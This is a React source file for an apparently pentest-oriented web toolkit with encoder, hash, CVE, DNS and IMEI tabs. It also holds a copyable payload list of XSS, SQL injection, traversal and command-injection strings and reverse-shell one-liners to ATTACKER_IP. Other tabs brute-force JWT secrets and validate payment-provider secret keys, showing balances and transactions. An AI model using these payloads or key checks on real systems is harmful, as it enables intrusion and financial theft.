import { useState, useEffect } from "react";
import { api, formatApiError } from "@/lib/api";
import { safeHttpUrl } from "@/lib/safeUrl";
import { SeverityBadge } from "@/components/SeverityBadge";
import { statusBadges } from "@/lib/imei";
import { toast } from "sonner";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import {
  Wrench, Binary, Hash, KeyRound, Lock, Bug, Database, Globe, Loader2, Copy,
  Search, ArrowRightLeft, ShieldCheck, ShieldAlert, RefreshCw, ExternalLink,
  Smartphone, Cpu, History, CreditCard, Wallet, Receipt, Eye, EyeOff, Landmark, ShieldX,
  Terminal, Shuffle, Network, ScanSearch, Unlock, ServerCog, Wand2, Radar, Waypoints, Send, Upload,
  FolderSearch, Fingerprint, AtSign, Globe2, Braces, GitBranch,
} from "lucide-react";

const inputCls = "w-full bg-[#0a0a0a] border border-zinc-800 text-white px-3 py-2.5 text-sm font-mono focus:outline-none focus:border-primary transition-colors";
const areaCls = inputCls + " min-h-[120px] resize-y";
const btnCls = "bg-primary text-black font-semibold px-4 py-2.5 inline-flex items-center justify-center gap-2 hover:bg-yellow-500 transition-colors disabled:opacity-60";

const copy = (t) => { navigator.clipboard.writeText(t || ""); toast.success("Copied"); };
const copyBlob = (text, filename, type) => {
  const url = window.URL.createObjectURL(new Blob([text], { type: type || "text/plain" }));
  const a = document.createElement("a");
  a.href = url; a.download = filename; a.click();
  window.URL.revokeObjectURL(url);
  toast.success("Downloaded");
};

function StatusBadges({ result, testId }) {
  const badges = statusBadges(result);
  if (!badges.length) return null;
  return (
    <span className="inline-flex flex-wrap gap-1.5" data-testid={testId}>
      {badges.map((b, i) => (
        <span key={i} className="font-mono text-xs font-bold px-2.5 py-1 border" data-testid={`imei-badge-${b.label.split(' ')[0].toLowerCase()}`}
          style={{ color: b.color, borderColor: b.color + "66", background: b.color + "14" }}>{b.label}</span>
      ))}
    </span>
  );
}

function DeviceRows({ result, imei }) {
  if (!result || typeof result !== "object") return null;
  const meta = Object.entries(result).filter(([k]) => !["brand_name", "model", "image"].includes(k));
  return (
    <div className="space-y-1.5 font-mono text-xs">
      {imei && <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">IMEI</span><span className="text-primary">{imei}</span></div>}
      {meta.map(([k, v]) => (
        <div key={k} className="flex justify-between gap-3 border-b border-border/50 pb-1">
          <span className="text-zinc-500">{k}</span>
          <span className="text-zinc-300 text-right break-all">{typeof v === "object" ? JSON.stringify(v) : String(v)}</span>
        </div>
      ))}
    </div>
  );
}

/* ---------- transforms ---------- */
const enc = new TextEncoder(); const dec = new TextDecoder();
const b64enc = (s) => btoa(String.fromCharCode(...enc.encode(s)));
const b64dec = (s) => dec.decode(Uint8Array.from(atob(s.trim()), (c) => c.charCodeAt(0)));
const hexenc = (s) => [...enc.encode(s)].map((b) => b.toString(16).padStart(2, "0")).join("");
const hexdec = (s) => dec.decode(Uint8Array.from(s.replace(/\s+/g, "").match(/.{1,2}/g) || [], (h) => parseInt(h, 16)));
const binenc = (s) => [...enc.encode(s)].map((b) => b.toString(2).padStart(8, "0")).join(" ");
const bindec = (s) => dec.decode(Uint8Array.from(s.trim().split(/\s+/), (b) => parseInt(b, 2)));
const htmlenc = (s) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
// Decode HTML entities without an innerHTML sink (no DOM parsing of untrusted text).
const HTML_NAMED = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: "\u00a0" };
const htmldec = (s) => String(s).replace(/&(#x?[0-9a-fA-F]+|[a-zA-Z]+);/g, (m, e) => {
  if (e[0] === "#") {
    const code = e[1].toLowerCase() === "x" ? parseInt(e.slice(2), 16) : parseInt(e.slice(1), 10);
    try { return Number.isFinite(code) ? String.fromCodePoint(code) : m; } catch { return m; }
  }
  return Object.prototype.hasOwnProperty.call(HTML_NAMED, e.toLowerCase()) ? HTML_NAMED[e.toLowerCase()] : m;
});
const rot13 = (s) => s.replace(/[a-zA-Z]/g, (c) => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c.charCodeAt(0) + 13) ? c.charCodeAt(0) + 13 : c.charCodeAt(0) - 13));

const OPS = {
  "Base64 encode": b64enc, "Base64 decode": b64dec,
  "URL encode": encodeURIComponent, "URL decode": decodeURIComponent,
  "Hex encode": hexenc, "Hex decode": hexdec,
  "Binary encode": binenc, "Binary decode": bindec,
  "HTML encode": htmlenc, "HTML decode": htmldec,
  "ROT13": rot13,
};

function EncoderTab() {
  const [text, setText] = useState("");
  const [op, setOp] = useState("Base64 encode");
  const [out, setOut] = useState("");
  const run = () => { try { setOut(OPS[op](text)); } catch { setOut("⚠ invalid input for this operation"); } };
  return (
    <div className="grid md:grid-cols-2 gap-4">
      <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="encoder-input-panel">
        <label className="data-label">Input</label>
        <textarea className={areaCls} value={text} onChange={(e) => setText(e.target.value)} data-testid="encoder-input" placeholder="Paste text or data…" />
        <div className="flex gap-2">
          <select className={inputCls} value={op} onChange={(e) => setOp(e.target.value)} data-testid="encoder-op">
            {Object.keys(OPS).map((k) => <option key={k} value={k}>{k}</option>)}
          </select>
          <button className={btnCls} onClick={run} data-testid="encoder-run"><ArrowRightLeft className="w-4 h-4" /> Run</button>
        </div>
      </div>
      <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="encoder-output-panel">
        <div className="flex items-center justify-between"><label className="data-label">Output</label>
          <button onClick={() => copy(out)} className="text-zinc-500 hover:text-primary" data-testid="encoder-copy"><Copy className="w-3.5 h-3.5" /></button></div>
        <textarea readOnly className={areaCls + " text-primary"} value={out} data-testid="encoder-output" placeholder="Result appears here…" />
      </div>
    </div>
  );
}

function HashTab() {
  const [text, setText] = useState("");
  const [res, setRes] = useState(null);
  const run = async () => {
    const algos = ["SHA-1", "SHA-256", "SHA-384", "SHA-512"];
    const out = {};
    for (const a of algos) {
      const buf = await crypto.subtle.digest(a, enc.encode(text));
      out[a] = [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
    }
    setRes(out);
  };
  return (
    <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="hash-panel">
      <label className="data-label">Text to hash</label>
      <textarea className={areaCls} value={text} onChange={(e) => setText(e.target.value)} data-testid="hash-input" placeholder="Enter text…" />
      <button className={btnCls} onClick={run} data-testid="hash-run"><Hash className="w-4 h-4" /> Compute Hashes</button>
      {res && (
        <div className="space-y-2 pt-2" data-testid="hash-result">
          {Object.entries(res).map(([a, h]) => (
            <div key={a} className="border border-border bg-[#0a0a0a] p-3">
              <div className="flex items-center justify-between"><span className="data-label">{a}</span>
                <button onClick={() => copy(h)} className="text-zinc-500 hover:text-primary"><Copy className="w-3 h-3" /></button></div>
              <p className="font-mono text-[11px] text-primary break-all mt-1">{h}</p>
            </div>
          ))}
          <p className="text-[11px] text-zinc-600">MD5 is intentionally omitted (browser crypto exposes SHA family only).</p>
        </div>
      )}
    </div>
  );
}

function JwtTab() {
  const [token, setToken] = useState("");
  const [res, setRes] = useState(null);
  const [err, setErr] = useState("");
  const b64urldec = (s) => { s = s.replace(/-/g, "+").replace(/_/g, "/"); while (s.length % 4) s += "="; return b64dec(s); };
  const decode = () => {
    setErr(""); setRes(null);
    const parts = token.trim().split(".");
    if (parts.length < 2) { setErr("Not a valid JWT (need header.payload.signature)"); return; }
    try {
      const header = JSON.parse(b64urldec(parts[0]));
      const payload = JSON.parse(b64urldec(parts[1]));
      setRes({ header, payload, sig: parts[2] || "" });
    } catch { setErr("Could not decode — malformed base64url segments"); }
  };
  const exp = res?.payload?.exp;
  const expired = exp ? exp * 1000 < Date.now() : null;
  const [cracking, setCracking] = useState(false);
  const [crack, setCrack] = useState(null);
  const bruteforce = async () => {
    if (!token.trim()) return toast.error("Paste a JWT first");
    setCracking(true); setCrack(null);
    try {
      const { data } = await api.post("/toolkit/jwt-crack", { token: token.trim() });
      setCrack(data);
      if (data.alg_none_vuln) toast.error("alg:none — signature can be stripped!");
      else if (data.cracked) toast.success(`Secret cracked: ${data.cracked}`);
      else if (data.crackable) toast.message("Secret not in wordlist");
      else toast.message(data.note || "Not HMAC-signed");
    } catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); }
    finally { setCracking(false); }
  };
  return (
    <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="jwt-panel">
      <label className="data-label">JWT token</label>
      <textarea className={areaCls} value={token} onChange={(e) => setToken(e.target.value)} data-testid="jwt-input" placeholder="eyJhbGci..." />
      <div className="flex gap-2 flex-wrap">
        <button className={btnCls} onClick={decode} data-testid="jwt-run"><KeyRound className="w-4 h-4" /> Decode</button>
        <button className={btnCls + " bg-transparent border border-primary/40 text-primary hover:bg-primary/10"} onClick={bruteforce} disabled={cracking} data-testid="jwt-crack-run">
          {cracking ? <Loader2 className="w-4 h-4 animate-spin" /> : <Unlock className="w-4 h-4" />} Brute-force secret
        </button>
      </div>
      {crack && (
        <div className="border p-3" data-testid="jwt-crack-result" style={{ borderColor: crack.cracked || crack.alg_none_vuln ? "#EF444466" : "#71717A55", background: crack.cracked || crack.alg_none_vuln ? "#EF444414" : "#71717A14" }}>
          {crack.alg_none_vuln ? (
            <p className="font-heading text-sm font-semibold text-severity-critical">alg:none — attacker can strip the signature and forge tokens</p>
          ) : crack.cracked ? (
            <><p className="font-heading text-sm font-semibold text-severity-critical">WEAK SECRET CRACKED ({crack.alg})</p><p className="font-mono text-lg text-white mt-0.5 break-all" data-testid="jwt-crack-secret">{crack.cracked}</p><p className="data-label mt-1">You can now forge valid tokens. tried {crack.tried?.toLocaleString()} of {crack.wordlist_size?.toLocaleString()}</p></>
          ) : (
            <p className="font-heading text-sm font-semibold text-zinc-300">{crack.crackable ? `Secret not found in ${crack.wordlist_size?.toLocaleString()} words (strong secret)` : (crack.note || "Not an HMAC token")}</p>
          )}
        </div>
      )}
      {err && <p className="text-sm text-severity-high" data-testid="jwt-error">{err}</p>}
      {res && (
        <div className="space-y-3 pt-2" data-testid="jwt-result">
          <div className="flex flex-wrap gap-2">
            <span className="font-mono text-[11px] border border-border bg-[#0a0a0a] px-2 py-1 text-zinc-300">alg: <span className="text-primary">{res.header.alg}</span></span>
            {res.header.typ && <span className="font-mono text-[11px] border border-border bg-[#0a0a0a] px-2 py-1 text-zinc-300">typ: {res.header.typ}</span>}
            {String(res.header.alg).toLowerCase() === "none" && <span className="font-mono text-[11px] border border-severity-critical/40 bg-severity-critical/10 text-severity-critical px-2 py-1">alg:none — signature bypass risk</span>}
            {expired === true && <span className="font-mono text-[11px] border border-severity-high/40 bg-severity-high/10 text-severity-high px-2 py-1">EXPIRED</span>}
            {expired === false && <span className="font-mono text-[11px] border border-emerald-500/40 bg-emerald-500/10 text-emerald-400 px-2 py-1">valid (not expired)</span>}
          </div>
          {["header", "payload"].map((k) => (
            <div key={k} className="border border-border bg-[#0a0a0a] p-3">
              <p className="data-label mb-1">{k}</p>
              <pre className="font-mono text-[11px] text-zinc-300 whitespace-pre-wrap break-all">{JSON.stringify(res[k], null, 2)}</pre>
            </div>
          ))}
          {exp && <p className="data-label">exp: {new Date(exp * 1000).toISOString().replace("T", " ").slice(0, 19)} UTC</p>}
        </div>
      )}
    </div>
  );
}

const SETS = { lower: "abcdefghijklmnopqrstuvwxyz", upper: "ABCDEFGHIJKLMNOPQRSTUVWXYZ", digits: "0123456789", symbols: "!@#$%^&*()-_=+[]{};:,.<>?/" };
const crackTime = (guesses) => {
  const s = guesses / 1e10;
  if (s < 1) return "< 1 second"; const u = [["year", 31536000], ["day", 86400], ["hour", 3600], ["minute", 60], ["second", 1]];
  for (const [n, sec] of u) { if (s >= sec) { const v = Math.round(s / sec); return `~${v.toLocaleString()} ${n}${v > 1 ? "s" : ""}`; } }
  return "< 1 second";
};
function PasswordTab() {
  const [pw, setPw] = useState("");
  const [len, setLen] = useState(20);
  const [opts, setOpts] = useState({ lower: true, upper: true, digits: true, symbols: true });
  let charset = 0;
  if (/[a-z]/.test(pw)) charset += 26; if (/[A-Z]/.test(pw)) charset += 26;
  if (/[0-9]/.test(pw)) charset += 10; if (/[^a-zA-Z0-9]/.test(pw)) charset += 33;
  const entropy = pw.length ? Math.round(pw.length * Math.log2(charset || 1)) : 0;
  const label = entropy < 28 ? ["Very weak", "#EF4444"] : entropy < 50 ? ["Weak", "#F97316"] : entropy < 70 ? ["Fair", "#F59E0B"] : entropy < 100 ? ["Strong", "#3B82F6"] : ["Very strong", "#22C55E"];
  const time = pw.length ? crackTime(Math.pow(charset || 1, pw.length)) : "—";
  const gen = () => {
    const pool = Object.keys(opts).filter((k) => opts[k]).map((k) => SETS[k]).join("");
    if (!pool) return toast.error("Enable at least one set");
    const arr = new Uint32Array(len); crypto.getRandomValues(arr);
    setPw([...arr].map((n) => pool[n % pool.length]).join(""));
  };
  return (
    <div className="grid md:grid-cols-2 gap-4">
      <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="pw-analyzer">
        <label className="data-label">Analyze password</label>
        <input className={inputCls} value={pw} onChange={(e) => setPw(e.target.value)} data-testid="pw-input" placeholder="Type or generate…" />
        <div className="flex items-center justify-between"><span className="data-label">Strength</span><span className="font-mono text-sm font-bold" style={{ color: label[1] }} data-testid="pw-strength">{pw ? label[0] : "—"}</span></div>
        <div className="h-2 bg-[#0a0a0a] border border-border overflow-hidden"><div className="h-full transition-all" style={{ width: `${Math.min(100, entropy)}%`, background: label[1] }} /></div>
        <div className="grid grid-cols-2 gap-3 pt-1">
          <div className="border border-border bg-[#0a0a0a] px-3 py-2"><p className="data-label">Entropy</p><p className="font-mono text-lg text-white">{entropy} <span className="text-xs text-zinc-500">bits</span></p></div>
          <div className="border border-border bg-[#0a0a0a] px-3 py-2"><p className="data-label">Est. crack time</p><p className="font-mono text-sm text-white mt-1">{time}</p></div>
        </div>
      </div>
      <div className="bg-[#121212] border border-border p-5 space-y-3" data-testid="pw-generator">
        <label className="data-label">Generator</label>
        <div className="flex items-center gap-3">
          <input type="range" min="8" max="64" value={len} onChange={(e) => setLen(+e.target.value)} className="flex-1 accent-primary" data-testid="pw-length" />
          <span className="font-mono text-sm text-primary w-8">{len}</span>
        </div>
        <div className="grid grid-cols-2 gap-2">
          {Object.keys(SETS).map((k) => (
            <button key={k} onClick={() => setOpts((o) => ({ ...o, [k]: !o[k] }))} data-testid={`pw-set-${k}`}
              className={`px-3 py-2 text-sm border transition-colors ${opts[k] ? "border-primary/50 bg-primary/10 text-white" : "border-zinc-800 text-zinc-500"}`}>{k}</button>
          ))}
        </div>
        <button className={btnCls + " w-full"} onClick={gen} data-testid="pw-generate"><RefreshCw className="w-4 h-4" /> Generate</button>
      </div>
    </div>
  );
}

const PAYLOADS = [
  { cat: "XSS", items: ["<script>alert(document.domain)</script>", "\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(1)", "'\"><iframe src=javascript:alert(1)>"] },
  { cat: "SQL Injection", items: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL,NULL-- -", "'; WAITFOR DELAY '0:0:5'-- -"] },
  { cat: "Path Traversal / LFI", items: ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php", "....//....//etc/passwd"] },
  { cat: "Command Injection", items: ["; id", "| id", "`id`", "$(id)", "&& whoami"] },
  { cat: "SSTI", items: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config.items()}}"] },
  { cat: "Reverse Shell", items: ["bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", "nc -e /bin/sh ATTACKER_IP 4444", "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'", "php -r '$s=fsockopen(\"ATTACKER_IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"] },
];
function PayloadTab() {
  return (
    <div className="space-y-4" data-testid="payload-panel">
      <p className="text-xs text-zinc-500 font-mono">Reference payloads for authorized testing. Replace ATTACKER_IP with your listener. Use only on systems you are permitted to test.</p>
      {PAYLOADS.map((p) => (
        <div key={p.cat} className="bg-[#121212] border border-border" data-testid={`payload-${p.cat.split(' ')[0].toLowerCase()}`}>
          <div className="px-5 py-3 border-b border-border flex items-center gap-2"><Bug className="w-4 h-4 text-primary" /><h3 className="font-heading text-sm font-semibold">{p.cat}</h3></div>
          <div className="p-4 space-y-2">
            {p.items.map((it, i) => (
              <div key={i} className="flex items-center justify-between gap-3 border border-border bg-[#0a0a0a] px-3 py-2">
                <code className="font-mono text-[11px] text-zinc-300 break-all">{it}</code>
                <button onClick={() => copy(it)} className="text-zinc-500 hover:text-primary shrink-0"><Copy className="w-3.5 h-3.5" /></button>
              </div>
            ))}
          </div>
        </div>
      ))}
    </div>
  );
}

function CveTab() {
  const [kw, setKw] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const run = async (e) => {
    e.preventDefault(); if (!kw.trim()) return toast.error("Enter a keyword or product");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/cve", { keyword: kw.trim(), limit: 15 }); setRes(data); toast.success(`${data.total} CVEs found`); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Search failed"); }
    finally { setBusy(false); }
  };
  return (
    <div className="space-y-4" data-testid="cve-panel">
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={kw} onChange={(e) => setKw(e.target.value)} data-testid="cve-input" placeholder="product or keyword (e.g. apache log4j)" />
        <button className={btnCls} disabled={busy} data-testid="cve-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />} Search NVD</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="cve-result">
          <p className="data-label">{res.total} total · showing {res.results.length}</p>
          {res.results.map((c, i) => (
            <a key={i} href={safeHttpUrl(c.url)} target="_blank" rel="noreferrer" data-testid={`cve-${i}`}
              className="block border border-border bg-[#121212] p-4 hover:border-primary/40 transition-colors">
              <div className="flex items-center gap-2 flex-wrap">
                <SeverityBadge severity={c.severity || "info"} />
                <span className="font-mono text-sm text-white">{c.id}</span>
                {c.cvss != null && <span className="font-mono text-xs text-zinc-400">CVSS {c.cvss}</span>}
                <span className="ml-auto data-label">{c.published}</span>
                <ExternalLink className="w-3.5 h-3.5 text-zinc-600" />
              </div>
              <p className="text-sm text-zinc-400 mt-2 leading-relaxed">{c.description}</p>
              {c.vector && <p className="font-mono text-[10px] text-zinc-600 mt-2">{c.vector}</p>}
            </a>
          ))}
          {res.results.length === 0 && <p className="text-sm text-zinc-500">No CVEs matched.</p>}
        </div>
      )}
    </div>
  );
}

function DnsTab() {
  const [domain, setDomain] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const run = async (e) => {
    e.preventDefault(); if (!domain.trim()) return toast.error("Enter a domain");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/dns", { domain: domain.trim() }); setRes(data); toast.success("Records resolved"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Lookup failed"); }
    finally { setBusy(false); }
  };
  const w = res?.whois || {};
  return (
    <div className="space-y-4" data-testid="dns-panel">
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={domain} onChange={(e) => setDomain(e.target.value)} data-testid="dns-input" placeholder="example.com" />
        <button className={btnCls} disabled={busy} data-testid="dns-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />} Lookup</button>
      </form>
      {res && (
        <div className="grid md:grid-cols-2 gap-4" data-testid="dns-result">
          <div className="bg-[#121212] border border-border p-5 space-y-1.5">
            <p className="data-label mb-2">DNS Records</p>
            {Object.entries(res.records || {}).map(([rt, vals]) => (
              <div key={rt} className="flex gap-2 border-b border-border/50 pb-1 font-mono text-xs"><span className="text-zinc-500 w-12 shrink-0">{rt}</span><span className="text-zinc-300 break-all">{vals.join(", ")}</span></div>
            ))}
            <div className="flex items-center gap-2 pt-2">
              {res.spf ? <span className="inline-flex items-center gap-1 text-emerald-400 text-xs"><ShieldCheck className="w-3.5 h-3.5" /> SPF</span> : <span className="inline-flex items-center gap-1 text-severity-high text-xs"><ShieldAlert className="w-3.5 h-3.5" /> no SPF</span>}
              {res.dmarc ? <span className="inline-flex items-center gap-1 text-emerald-400 text-xs"><ShieldCheck className="w-3.5 h-3.5" /> DMARC</span> : <span className="inline-flex items-center gap-1 text-severity-high text-xs"><ShieldAlert className="w-3.5 h-3.5" /> no DMARC</span>}
            </div>
          </div>
          <div className="bg-[#121212] border border-border p-5 space-y-1.5 font-mono text-xs">
            <p className="data-label mb-2">WHOIS</p>
            {w.registrar ? (<>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Registrar</span><span className="text-zinc-300 text-right">{w.registrar}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Created</span><span className="text-zinc-300 text-right">{String(w.created).slice(0, 10)}</span></div>
              <div className="flex justify-between"><span className="text-zinc-500">Expires</span><span className="text-zinc-300 text-right">{String(w.expires).slice(0, 10)}</span></div>
            </>) : <p className="text-zinc-500">No WHOIS data available.</p>}
          </div>
        </div>
      )}
    </div>
  );
}

function ImeiTab() {
  const [imei, setImei] = useState("");
  const [serviceId, setServiceId] = useState(0);
  const [services, setServices] = useState([]);
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const [history, setHistory] = useState([]);
  const [q, setQ] = useState("");
  const [detail, setDetail] = useState(null);
  const loadHistory = () => api.get("/toolkit/imei/history").then(({ data }) => setHistory(data.results || [])).catch(() => {});
  useEffect(() => {
    api.get("/toolkit/imei/services").then(({ data }) => setServices(data)).catch(() => {});
    loadHistory();
  }, []);
  const run = async (e) => {
    e.preventDefault();
    if (!imei.trim()) return toast.error("Enter an IMEI");
    setBusy(true); setRes(null);
    try {
      const { data } = await api.post("/toolkit/imei", { imei: imei.trim(), service_id: Number(serviceId) });
      setRes(data); toast.success(`${data.status || "Done"} · ${data.service || "IMEI check"}`); loadHistory();
    } catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "IMEI lookup failed"); }
    finally { setBusy(false); }
  };
  const result = res?.result;
  const filtered = history.filter((h) => {
    const s = q.trim().toLowerCase();
    return !s || [h.imei, h.brand, h.model, h.service].some((x) => String(x || "").toLowerCase().includes(s));
  });
  return (
    <div className="space-y-4" data-testid="imei-panel">
      <p className="text-xs text-zinc-500 font-mono">Powered by imei.info · each check consumes API tokens. Enter a 15-digit IMEI (dial *#06# on the device).</p>
      <form onSubmit={run} className="grid sm:grid-cols-[1fr_auto_auto] gap-2">
        <input className={inputCls} value={imei} onChange={(e) => setImei(e.target.value)} data-testid="imei-input" placeholder="356166091795616" inputMode="numeric" />
        <select className={inputCls} value={serviceId} onChange={(e) => setServiceId(e.target.value)} data-testid="imei-service">
          {services.length === 0 && <option value={0}>Basic IMEI Check</option>}
          {services.map((s) => <option key={s.id} value={s.id}>{s.name}{s.price && s.price !== "Token based" ? ` ($${s.price})` : ""}</option>)}
        </select>
        <button className={btnCls} disabled={busy} data-testid="imei-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Search className="w-4 h-4" />} Check</button>
      </form>

      {res && (
        <div className="bg-[#121212] border border-border" data-testid="imei-result">
          <div className="flex items-center gap-3 px-5 py-4 border-b border-border">
            <div className="w-10 h-10 border border-border bg-[#0a0a0a] flex items-center justify-center shrink-0"><Cpu className="w-5 h-5 text-primary" /></div>
            <div className="min-w-0">
              <p className="font-heading text-lg font-semibold truncate" data-testid="imei-device">{result?.brand_name ? `${result.brand_name} ${result.model || ""}`.trim() : (result?.manufacturer ? `${result.manufacturer} ${result.model || result.model_name || ""}`.trim() : (res.service || "Result"))}</p>
              <p className="data-label mt-0.5">{res.service} · {res.status}{res.token_request_price ? ` · ${res.token_request_price} tokens` : ""}</p>
            </div>
            <span className="ml-auto"><StatusBadges result={result} testId="imei-status-badges" /></span>
            <button onClick={() => copy(JSON.stringify(res.result || res, null, 2))} className="ml-3 text-zinc-500 hover:text-primary shrink-0" data-testid="imei-copy"><Copy className="w-4 h-4" /></button>
          </div>
          <div className="p-5"><DeviceRows result={result} imei={res.imei} />{!result && res.text && <p className="text-zinc-300 whitespace-pre-wrap font-mono text-xs">{res.text}</p>}</div>
        </div>
      )}

      {/* History panel */}
      <div className="bg-[#121212] border border-border" data-testid="imei-history">
        <div className="flex items-center gap-2 px-5 py-3.5 border-b border-border">
          <History className="w-4 h-4 text-primary" />
          <h3 className="font-heading text-sm font-semibold">IMEI Check History</h3>
          <span className="data-label">{history.length}</span>
          <button onClick={loadHistory} className="ml-auto text-zinc-500 hover:text-primary" data-testid="imei-history-refresh"><RefreshCw className="w-3.5 h-3.5" /></button>
        </div>
        <div className="p-3 border-b border-border">
          <div className="relative">
            <Search className="w-3.5 h-3.5 text-zinc-600 absolute left-3 top-1/2 -translate-y-1/2" />
            <input className={inputCls + " pl-9"} value={q} onChange={(e) => setQ(e.target.value)} data-testid="imei-history-search" placeholder="search by IMEI, brand, model or service…" />
          </div>
        </div>
        {filtered.length === 0 ? (
          <p className="p-5 text-sm text-zinc-600 text-center">{history.length ? "No matches." : "No past checks yet."}</p>
        ) : (
          <div className="divide-y divide-border max-h-96 overflow-y-auto">
            {filtered.map((h) => (
              <button key={h.id} onClick={() => setDetail(h)} data-testid={`imei-history-${h.id}`}
                className="w-full flex items-center gap-3 px-5 py-3 text-left hover:bg-white/[0.02] transition-colors">
                <Smartphone className="w-4 h-4 text-zinc-500 shrink-0" />
                <div className="min-w-0 flex-1">
                  <p className="text-sm text-white truncate">{h.brand ? `${h.brand} ${h.model || ""}`.trim() : (h.model || h.imei)}</p>
                  <p className="data-label mt-0.5 truncate">{h.imei} · {h.service}</p>
                </div>
                <StatusBadges result={h.result} />
                <span className="font-mono text-[10px] text-zinc-600 hidden md:block shrink-0">{(h.created_at || "").slice(0, 10)}</span>
              </button>
            ))}
          </div>
        )}
      </div>

      <Dialog open={!!detail} onOpenChange={(o) => !o && setDetail(null)}>
        <DialogContent className="bg-[#121212] border-border max-w-lg max-h-[85vh] overflow-y-auto" data-testid="imei-detail-dialog">
          <DialogHeader>
            <DialogTitle className="font-heading flex items-center gap-2"><Cpu className="w-4 h-4 text-primary" /> {detail?.brand ? `${detail.brand} ${detail.model || ""}`.trim() : (detail?.model || "IMEI Result")}</DialogTitle>
          </DialogHeader>
          {detail && (
            <div className="space-y-3">
              <div className="flex items-center justify-between gap-2 flex-wrap">
                <span className="data-label">{detail.service} · {detail.status}{detail.price ? ` · ${detail.price} tokens` : ""}</span>
                <StatusBadges result={detail.result} />
              </div>
              <DeviceRows result={detail.result} imei={detail.imei} />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}

const PAY_PROVIDERS = [
  { v: "auto", label: "Auto-detect" },
  { v: "stripe", label: "Stripe (sk_ / rk_)" },
  { v: "paystack", label: "Paystack (sk_)" },
  { v: "flutterwave", label: "Flutterwave (FLWSECK)" },
  { v: "razorpay", label: "Razorpay (key_id + secret)" },
  { v: "paypal", label: "PayPal (client_id + secret)" },
  { v: "square", label: "Square (access token)" },
  { v: "payu", label: "PayU" },
];
const needsSecret = (p) => p === "razorpay" || p === "paypal";
const fmtAmt = (a, c) => `${a == null ? "—" : (typeof a === "number" ? a.toLocaleString() : a)}${c ? " " + c : ""}`;

function KeyRow({ k, v }) {
  if (v == null || v === "") return null;
  return (
    <div className="flex justify-between gap-3 border-b border-border/50 py-1.5 font-mono text-xs">
      <span className="text-zinc-500">{k}</span>
      <span className="text-zinc-200 text-right break-all">{String(v)}</span>
    </div>
  );
}

function TxList({ title, icon: Icon, items, testId }) {
  if (!items || !items.length) return null;
  return (
    <div className="bg-[#121212] border border-border p-4" data-testid={testId}>
      <p className="data-label mb-2 flex items-center gap-2"><Icon className="w-3.5 h-3.5 text-primary" /> {title} <span className="text-zinc-600">({items.length})</span></p>
      <div className="space-y-1.5 font-mono text-[11px]">
        {items.map((t, i) => (
          <div key={i} className="flex items-center justify-between gap-2 border-b border-border/40 pb-1">
            <span className="text-zinc-400 truncate">{t.id || t.email || t.reason || "—"}</span>
            <span className="text-zinc-300 shrink-0">{fmtAmt(t.amount, t.currency)}{t.status ? ` · ${t.status}` : ""}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

function KeyReconTab() {
  const [provider, setProvider] = useState("auto");
  const [key, setKey] = useState("");
  const [secret, setSecret] = useState("");
  const [show, setShow] = useState(false);
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);

  const run = async (e) => {
    e.preventDefault();
    if (!key.trim()) return toast.error("Paste an API key to inspect");
    setBusy(true); setRes(null);
    try {
      const { data } = await api.post("/keyrecon/inspect", { provider, key: key.trim(), secret: secret.trim() || null });
      setRes(data);
      if (data.valid) toast.success(`Valid ${data.provider} key — access confirmed`);
      else if (data.valid === null) toast.message("Manual verification required");
      else toast.error(data.error || "Key did not authorize");
    } catch (err) {
      toast.error(formatApiError(err.response?.data?.detail) || "Inspection failed");
    } finally { setBusy(false); }
  };

  const s = res?.summary || {};
  const cap = res?.capabilities || {};
  const bal = res?.balance;

  return (
    <div className="space-y-4" data-testid="paykeys-panel">
      <p className="text-xs text-zinc-500 font-mono leading-relaxed">
